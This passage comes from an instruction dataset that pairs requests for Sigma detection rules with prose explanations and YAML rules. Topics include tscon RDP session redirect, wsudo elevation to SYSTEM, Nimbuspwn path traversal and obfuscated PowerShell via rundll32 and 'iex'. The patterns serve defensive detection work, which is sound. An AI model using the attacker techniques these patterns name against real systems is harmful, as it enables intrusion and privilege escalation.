      "Sigma": "logsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|re: 'http[s]?://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        TargetFilename|contains:\n            - '.ps1:Zone'\n            - '.bat:Zone'\n            - '.exe:Zone'\n            - '.vbe:Zone'\n            - '.vbs:Zone'\n            - '.dll:Zone'\n            - '.one:Zone'\n            - '.cmd:Zone'\n            - '.hta:Zone'\n            - '.xll:Zone'\n            - '.lnk:Zone'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "download of suspicious file type from URLs with IP",
      "answer": "In order to detect the download of suspicious file types from URLs with IP, you should focus on monitoring Windows event logs, specifically those related to the creation of stream hashes. These events can indicate when files are downloaded or modified, potentially signaling a cybersecurity threat.\n\nYour detection strategy should involve inspecting any event where the content of the file or the action taken includes references to HTTP or HTTPS URLs that are formatted with direct IP addresses, which is a common method attackers use to try and evade detection by not using human-readable domain names. It's crucial to particularly look out for file types that are commonly abused in attacks due to their capability to execute code. These file types include PowerShell scripts (.ps1), batch files (.bat), executable files (.exe), VBScript scripts (.vbs and .vbe), Dynamic Link Library files (.dll), OneNote files (.one), command prompt scripts (.cmd), HTML applications (.hta), Excel add-ins (.xll), and shortcut files (.lnk). The presence of ':Zone' in the TargetFilename field alongside these file extensions signals that these files have been marked with a security zone identifier, typically indicating they've been downloaded from the Internet, which can further corroborate the suspicion of a malicious download.\n\nGiven the level of threat is considered high, any detection matching these criteria should be investigated promptly to determine if it is a legitimate activity or an indication of an attempted or successful malicious action. It's important to note that while these detections are strongly indicative of suspicious activity, false positives are possible, albeit their sources are not well-defined. Thus, while responding to these alerts, one must apply a degree of scrutiny to effectively differentiate between benign and malevolent activities. Monitoring for such behaviors is aligned with tactics and techniques observed in real-world attacks, such as Execution, Persistence, Defense Evasion, and Command and Control, by notably focusing on the execution and use of scripts and executables that may be utilized by attackers to achieve their objectives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting mount of ISO images on an endpoint.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectServer: 'Security'\n        ObjectType: 'File'\n        ObjectName|startswith: '\\Device\\CdRom'\n    filter:\n        ObjectName: '\\Device\\CdRom0\\setup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software installation ISO files\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectServer: 'Security'\n        ObjectType: 'File'\n        ObjectName|startswith: '\\Device\\CdRom'\n    filter:\n        ObjectName: '\\Device\\CdRom0\\setup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software installation ISO files\nlevel: medium\n",
      "question": "mount of ISO images on an endpoint",
      "answer": "In order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious RDP session redirect using tscon.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious RDP session redirect using tscon.exe, you should: Focus on monitoring the creation of processes within Windows systems. Specifically, look for instances where the command line invocation includes the parameter ' /dest:rdp-tcp#' which is indicative of an attempt to redirect a Remote Desktop Protocol (RDP) session using the utility tscon.exe. Such activity is usually not common in day-to-day operations and could signify malicious intent, especially tactics that involve gaining or exercising control over remote systems. The importance of identifying this behavior is marked as high due to the potential for unauthorized access and control over targeted systems. There are no known benign instances automatically associated with this behavior, but care should be taken to verify the context of detections to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /dest:rdp-tcp#'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /dest:rdp-tcp#'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious RDP session redirect using tscon.exe",
      "answer": "In order to detect a suspicious RDP session redirect using tscon.exe, you should: Focus on monitoring the creation of processes within Windows systems. Specifically, look for instances where the command line invocation includes the parameter ' /dest:rdp-tcp#' which is indicative of an attempt to redirect a Remote Desktop Protocol (RDP) session using the utility tscon.exe. Such activity is usually not common in day-to-day operations and could signify malicious intent, especially tactics that involve gaining or exercising control over remote systems. The importance of identifying this behavior is marked as high due to the potential for unauthorized access and control over targeted systems. There are no known benign instances automatically associated with this behavior, but care should be taken to verify the context of detections to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of wsudo (Windows Sudo Utility), which is a tool that lets the user execute programs with different permissions (System, Trusted Installer, Administrator, etc), you should focus on monitoring process creation logs within Windows environments. Specifically, you should look for instances where a process named 'wsudo.exe' is created, as indicated by either the image name ending with '\\wsudo.exe' or having an original file name of 'wsudo.exe'. Additionally, when the description of the process explicitly mentions 'Windows sudo utility', or when the parent image of the process ends with '\\wsudo-bridge.exe', these are key indicators of wsudo usage.\n\nMoreover, the command lines associated with these processes should be scrutinized for specific flags that denote elevation of privilege or execution as a particular user type. Command-line arguments to watch for include '-u System', '-uSystem', '-u TrustedInstaller', '-uTrustedInstaller', or the presence of ' --ti ', as these indicate attempts to execute programs with elevated permissions or as specific system-level users.\n\nGiven the potential for this tool to be used in both legitimate and malicious contexts, there are not many known false positives; however, any unexpected or unauthorized use of wsudo within a Windows environment should be considered suspicious, especially at a high alert level. Identifying such activity revolves around the close examination of process creation logs, command-line arguments, and the relationship between parent and child processes related to wsudo activity. Monitoring for these specific indicators helps in promptly detecting and responding to unauthorized or malicious use of the Windows sudo utility, thereby mitigating the risks associated with privilege escalation and system compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)",
      "answer": "In order to detect usage of wsudo (Windows Sudo Utility), which is a tool that lets the user execute programs with different permissions (System, Trusted Installer, Administrator, etc), you should focus on monitoring process creation logs within Windows environments. Specifically, you should look for instances where a process named 'wsudo.exe' is created, as indicated by either the image name ending with '\\wsudo.exe' or having an original file name of 'wsudo.exe'. Additionally, when the description of the process explicitly mentions 'Windows sudo utility', or when the parent image of the process ends with '\\wsudo-bridge.exe', these are key indicators of wsudo usage.\n\nMoreover, the command lines associated with these processes should be scrutinized for specific flags that denote elevation of privilege or execution as a particular user type. Command-line arguments to watch for include '-u System', '-uSystem', '-u TrustedInstaller', '-uTrustedInstaller', or the presence of ' --ti ', as these indicate attempts to execute programs with elevated permissions or as specific system-level users.\n\nGiven the potential for this tool to be used in both legitimate and malicious contexts, there are not many known false positives; however, any unexpected or unauthorized use of wsudo within a Windows environment should be considered suspicious, especially at a high alert level. Identifying such activity revolves around the close examination of process creation logs, command-line arguments, and the relationship between parent and child processes related to wsudo activity. Monitoring for these specific indicators helps in promptly detecting and responding to unauthorized or malicious use of the Windows sudo utility, thereby mitigating the risks associated with privilege escalation and system compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800), you should: Monitor Linux system logs for specific indicators that signal an attack attempt related to these vulnerabilities. Look for log entries that contain any of the following keywords: 'networkd-dispatcher', 'Error handling notification for interface', or '../../'. These keywords suggest exploitation attempts that take advantage of the Nimbuspwn vulnerability, such as abnormal error handling notifications or the use of directory traversal patterns. It's important to treat any log entries matching these patterns with a high level of suspicion, as there are not known false positives that are common with these indicators in the context of a Linux environment. This detection focuses on key activities associated with privilege escalation attempts, leveraging the vulnerabilities in question.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        '|all':\n            - 'networkd-dispatcher'\n            - 'Error handling notification for interface'\n            - '../../'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        '|all':\n            - 'networkd-dispatcher'\n            - 'Error handling notification for interface'\n            - '../../'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)",
      "answer": "In order to detect exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800), you should: Monitor Linux system logs for specific indicators that signal an attack attempt related to these vulnerabilities. Look for log entries that contain any of the following keywords: 'networkd-dispatcher', 'Error handling notification for interface', or '../../'. These keywords suggest exploitation attempts that take advantage of the Nimbuspwn vulnerability, such as abnormal error handling notifications or the use of directory traversal patterns. It's important to treat any log entries matching these patterns with a high level of suspicion, as there are not known false positives that are common with these indicators in the context of a Linux environment. This detection focuses on key activities associated with privilege escalation attempts, leveraging the vulnerabilities in question."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of an executable by another executable.\nMore specifically, the Sigma rule should work as follows:\n\nTo detect the creation of an executable by another executable, you should monitor for events where an executable file creates another executable file within a Windows environment. This involves tracking file creation activities specifically where both the source (Image) and target (TargetFilename) elements end with '.exe', indicating the involvement of executable files. However, to reduce false positives and focus the detection, it's essential to exclude certain benign and system-related activities from triggering alarms. This includes ignoring file creation events initiated by known system processes like `msiexec.exe`, `cleanmgr.exe`, `explorer.exe`, among others, which are legitimate parts of Windows operations. Additionally, special attention should be given to exclude system-update-related activities, such as those involving `svchost.exe` interacting with Windows update directories or during Windows upgrade processes.\n\nKey exclusions also extend to activities involving common application update mechanisms, like those of Microsoft Teams or GitHub Desktop, where executable files might be created as part of their normal update process. Moreover, it's crucial to filter out processes associated with software installations, update utilities, and the execution of 32-bit applications launching their 64-bit counterparts to avoid misidentification of legitimate software behavior as malicious activities.\n\nIn essence, the detection aims to highlight unusual executable file creation occurrences that could indicate unauthorized or malicious software propagation. Still, it simultaneously avoids raising alerts on certified Windows update operations, legitimate software update processes, and recognized system activities to maintain a focus on potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '.exe'\n        TargetFilename|endswith: '.exe'\n    filter_whitelist:\n        Image:\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\system32\\cleanmgr.exe'\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\WINDOWS\\system32\\dxgiadaptercache.exe'\n            - 'C:\\WINDOWS\\system32\\Dism.exe'\n            - 'C:\\Windows\\System32\\wuauclt.exe'\n    filter_update:\n        # Security_UserID: S-1-5-18\n        # Example:\n        #   TargetFilename: C:\\Windows\\SoftwareDistribution\\Download\\803d1df4c931df4f3e50a022cda56e88\\WindowsUpdateBox.exe\n        Image: 'C:\\WINDOWS\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:\\Windows\\SoftwareDistribution\\Download\\'\n    filter_upgrade:\n        Image: 'C:\\Windows\\system32\\svchost.exe'\n        TargetFilename|contains|all:\n            # Example:\n            #   This example was seen during windows upgrade\n            #   TargetFilename: :\\WUDownloadCache\\803d1df4c931df4f3e50a022cda56e29\\WindowsUpdateBox.exe\n            - ':\\WUDownloadCache\\'\n            - '\\WindowsUpdateBox.exe'\n    filter_windows_update_box:\n        # This FP was seen during Windows Upgrade\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        Image|startswith: 'C:\\WINDOWS\\SoftwareDistribution\\Download\\'\n        Image|endswith: '\\WindowsUpdateBox.Exe'\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\Sources\\'\n    filter_tiworker:\n        Image|startswith: 'C:\\Windows\\WinSxS\\'\n        Image|endswith: '\\TiWorker.exe'\n    filter_programfiles:\n        - Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        - TargetFilename|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_defender:\n        Image|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n    filter_windows_apps:\n        TargetFilename|contains: '\\Microsoft\\WindowsApps\\'\n    filter_teams:\n        Image|endswith: '\\AppData\\Local\\Microsoft\\Teams\\Update.exe'\n        TargetFilename|endswith:\n            - '\\AppData\\Local\\Microsoft\\Teams\\stage\\Teams.exe'\n            - '\\AppData\\Local\\Microsoft\\Teams\\stage\\Squirrel.exe'\n            - '\\AppData\\Local\\Microsoft\\SquirrelTemp\\tempb\\'\n    filter_mscorsvw:\n        # Example:\n        #   ParentCommandLine: \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe\" ExecuteQueuedItems /LegacyServiceBehavior\n        #   Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\4f8c-0\\MSBuild.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\49bc-0\\testhost.net47.x86.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\39d8-0\\fsc.exe\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework\\'\n        Image|endswith: '\\mscorsvw.exe'\n        TargetFilename|startswith: 'C:\\Windows\\assembly\\NativeImages_'\n    filter_vscode:\n        Image|contains: '\\AppData\\Local\\'\n        Image|endswith: '\\Microsoft VS Code\\Code.exe'\n        TargetFilename|contains: '\\.vscode\\extensions\\'\n    filter_githubdesktop:\n        Image|endswith: '\\AppData\\Local\\GitHubDesktop\\Update.exe'\n        # Example TargetFileName:\n        #   \\AppData\\Local\\SquirrelTemp\\tempb\\lib\\net45\\GitHubDesktop_ExecutionStub.exe\n        #   \\AppData\\Local\\SquirrelTemp\\tempb\\lib\\net45\\squirrel.exe\n        TargetFilename|contains: '\\AppData\\Local\\SquirrelTemp\\'\n    filter_windows_temp:\n        TargetFilename|startswith: 'C:\\WINDOWS\\TEMP\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    #Please contribute to FP to increase the level\n    - Software installers\n    - Update utilities\n    - 32bit applications launching their 64bit versions\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '.exe'\n        TargetFilename|endswith: '.exe'\n    filter_whitelist:\n        Image:\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\system32\\cleanmgr.exe'\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\WINDOWS\\system32\\dxgiadaptercache.exe'\n            - 'C:\\WINDOWS\\system32\\Dism.exe'\n            - 'C:\\Windows\\System32\\wuauclt.exe'\n    filter_update:\n        # Security_UserID: S-1-5-18\n        # Example:\n        #   TargetFilename: C:\\Windows\\SoftwareDistribution\\Download\\803d1df4c931df4f3e50a022cda56e88\\WindowsUpdateBox.exe\n        Image: 'C:\\WINDOWS\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:\\Windows\\SoftwareDistribution\\Download\\'\n    filter_upgrade:\n        Image: 'C:\\Windows\\system32\\svchost.exe'\n        TargetFilename|contains|all:\n            # Example:\n            #   This example was seen during windows upgrade\n            #   TargetFilename: :\\WUDownloadCache\\803d1df4c931df4f3e50a022cda56e29\\WindowsUpdateBox.exe\n            - ':\\WUDownloadCache\\'\n            - '\\WindowsUpdateBox.exe'\n    filter_windows_update_box:\n        # This FP was seen during Windows Upgrade\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        Image|startswith: 'C:\\WINDOWS\\SoftwareDistribution\\Download\\'\n        Image|endswith: '\\WindowsUpdateBox.Exe'\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\Sources\\'\n    filter_tiworker:\n        Image|startswith: 'C:\\Windows\\WinSxS\\'\n        Image|endswith: '\\TiWorker.exe'\n    filter_programfiles:\n        - Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        - TargetFilename|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_defender:\n        Image|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n    filter_windows_apps:\n        TargetFilename|contains: '\\Microsoft\\WindowsApps\\'\n    filter_teams:\n        Image|endswith: '\\AppData\\Local\\Microsoft\\Teams\\Update.exe'\n        TargetFilename|endswith:\n            - '\\AppData\\Local\\Microsoft\\Teams\\stage\\Teams.exe'\n            - '\\AppData\\Local\\Microsoft\\Teams\\stage\\Squirrel.exe'\n            - '\\AppData\\Local\\Microsoft\\SquirrelTemp\\tempb\\'\n    filter_mscorsvw:\n        # Example:\n        #   ParentCommandLine: \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe\" ExecuteQueuedItems /LegacyServiceBehavior\n        #   Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\4f8c-0\\MSBuild.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\49bc-0\\testhost.net47.x86.exe\n        #       TargetFilename: C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Temp\\39d8-0\\fsc.exe\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework\\'\n        Image|endswith: '\\mscorsvw.exe'\n        TargetFilename|startswith: 'C:\\Windows\\assembly\\NativeImages_'\n    filter_vscode:\n        Image|contains: '\\AppData\\Local\\'\n        Image|endswith: '\\Microsoft VS Code\\Code.exe'\n        TargetFilename|contains: '\\.vscode\\extensions\\'\n    filter_githubdesktop:\n        Image|endswith: '\\AppData\\Local\\GitHubDesktop\\Update.exe'\n        # Example TargetFileName:\n        #   \\AppData\\Local\\SquirrelTemp\\tempb\\lib\\net45\\GitHubDesktop_ExecutionStub.exe\n        #   \\AppData\\Local\\SquirrelTemp\\tempb\\lib\\net45\\squirrel.exe\n        TargetFilename|contains: '\\AppData\\Local\\SquirrelTemp\\'\n    filter_windows_temp:\n        TargetFilename|startswith: 'C:\\WINDOWS\\TEMP\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    #Please contribute to FP to increase the level\n    - Software installers\n    - Update utilities\n    - 32bit applications launching their 64bit versions\nlevel: low\n",
      "question": "creation of an executable by another executable",
      "answer": "To detect the creation of an executable by another executable, you should monitor for events where an executable file creates another executable file within a Windows environment. This involves tracking file creation activities specifically where both the source (Image) and target (TargetFilename) elements end with '.exe', indicating the involvement of executable files. However, to reduce false positives and focus the detection, it's essential to exclude certain benign and system-related activities from triggering alarms. This includes ignoring file creation events initiated by known system processes like `msiexec.exe`, `cleanmgr.exe`, `explorer.exe`, among others, which are legitimate parts of Windows operations. Additionally, special attention should be given to exclude system-update-related activities, such as those involving `svchost.exe` interacting with Windows update directories or during Windows upgrade processes.\n\nKey exclusions also extend to activities involving common application update mechanisms, like those of Microsoft Teams or GitHub Desktop, where executable files might be created as part of their normal update process. Moreover, it's crucial to filter out processes associated with software installations, update utilities, and the execution of 32-bit applications launching their 64-bit counterparts to avoid misidentification of legitimate software behavior as malicious activities.\n\nIn essence, the detection aims to highlight unusual executable file creation occurrences that could indicate unauthorized or malicious software propagation. Still, it simultaneously avoids raising alerts on certified Windows update operations, legitimate software update processes, and recognized system activities to maintain a focus on potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels.\nEnsure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that encrypted channels are used for all administrative account access, you should monitor network traffic through firewall logs for communication over common ports associated with unencrypted services. Specifically, look for traffic destined to ports 8080, 21, 80, 23, 50000, 1521, 27017, 3306, 1433, 11211, 15672, 5900, 5901, 5902, 5903, 5904. These ports often correspond to services that might not use encryption by default, such as web servers (HTTP), FTP, Telnet, various databases, and other application-specific protocols. \n\nEffective detection should include verifying that actions related to this traffic are set to either forward, accept, or are marked with a numerical value like '2', which can denote an allowable action in certain firewall configurations. Furthermore, consider if the firewall marks the connection as not blocked (either not explicitly setting an action or by marking the connection as allowed). \n\nIt is crucial to be aware that some legitimate traffic to these ports may not represent a breach of sensitive information transmission policies, resulting in potential false positives. Thus, while monitoring for these conditions signifies potential policy violations, each alert should be scrutinized to confirm the nature of the transmitted data and the encryption status of the channel. Similarly, it is essential to ensure administrative account access and sensitive information travel exclusively through encrypted channels to prevent unauthorized access and data interception, reinforcing the organization's cybersecurity posture against espionage and data theft.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: firewall\ndetection:\n    selection:\n        dst_port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 3306\n            - 1433\n            - 11211\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    selection_allow1:\n        action:\n            - forward\n            - accept\n            - 2\n    selection_allow2:\n        blocked: \"false\" # not all fws set action value, but are set to mark as blocked or allowed or not\n    condition: selection and 1 of selection_allow*\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: firewall\ndetection:\n    selection:\n        dst_port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 3306\n            - 1433\n            - 11211\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    selection_allow1:\n        action:\n            - forward\n            - accept\n            - 2\n    selection_allow2:\n        blocked: \"false\" # not all fws set action value, but are set to mark as blocked or allowed or not\n    condition: selection and 1 of selection_allow*\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels.\nEnsure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access.\n",
      "answer": "In order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that encrypted channels are used for all administrative account access, you should monitor network traffic through firewall logs for communication over common ports associated with unencrypted services. Specifically, look for traffic destined to ports 8080, 21, 80, 23, 50000, 1521, 27017, 3306, 1433, 11211, 15672, 5900, 5901, 5902, 5903, 5904. These ports often correspond to services that might not use encryption by default, such as web servers (HTTP), FTP, Telnet, various databases, and other application-specific protocols. \n\nEffective detection should include verifying that actions related to this traffic are set to either forward, accept, or are marked with a numerical value like '2', which can denote an allowable action in certain firewall configurations. Furthermore, consider if the firewall marks the connection as not blocked (either not explicitly setting an action or by marking the connection as allowed). \n\nIt is crucial to be aware that some legitimate traffic to these ports may not represent a breach of sensitive information transmission policies, resulting in potential false positives. Thus, while monitoring for these conditions signifies potential policy violations, each alert should be scrutinized to confirm the nature of the transmitted data and the encryption status of the channel. Similarly, it is essential to ensure administrative account access and sensitive information travel exclusively through encrypted channels to prevent unauthorized access and data interception, reinforcing the organization's cybersecurity posture against espionage and data theft."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use Rundll32 in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated PowerShell via the use of Rundll32 in scripts, you should monitor Windows PowerShell module logs for specific patterns that indicate potential suspicious activity. Focus on events with payload content that includes a combination of '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. These elements in conjunction with either of 'value', 'invoke', 'comspec', or 'iex' within the payload suggest an attempt to obscure the true nature of the PowerShell script's actions, which often involves invoking rundll32 to execute malicious code indirectly. This method of script obfuscation is a sophisticated technique used to evade detection by hiding the true intent of the PowerShell script, making it crucial to identify these patterns to mitigate possible threats. The detection of such activity is associated with high severity due to the potential for malicious actions being executed through obscure and indirect methods. Keep in mind that while this detection strategy is essential, false positives are unknown, indicating the necessity for manual verification of detected incidents to confirm their malicious nature.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - '&&'\n            - 'rundll32'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n        Payload|contains:\n            - 'value'\n            - 'invoke'\n            - 'comspec'\n            - 'iex'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - '&&'\n            - 'rundll32'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n        Payload|contains:\n            - 'value'\n            - 'invoke'\n            - 'comspec'\n            - 'iex'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use Rundll32 in Scripts",
